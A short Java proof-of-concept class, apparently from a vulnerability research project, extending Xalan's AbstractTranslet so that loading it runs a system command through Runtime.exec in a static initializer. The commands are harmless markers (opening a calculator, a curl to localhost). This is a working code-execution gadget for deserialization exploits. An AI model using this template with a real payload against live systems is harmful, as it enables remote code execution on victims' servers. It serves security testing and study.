package org.javaweb.vuln;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

public class TestAbstractTranslet extends AbstractTranslet implements Runnable {

	private static String command = "open -a Calculator.app";

	static {
		String osName = System.getProperty("os.name");

		if (osName.startsWith("Windows")) {
			command = "calc 12345678901234567";
		} else if (osName.startsWith("Linux")) {
			command = "curl localhost:9999/";
		}

		new Thread(new TestAbstractTranslet()).start();
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {

	}

	@Override
	public void run() {
		try {
			Runtime.getRuntime().exec(command);
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}

}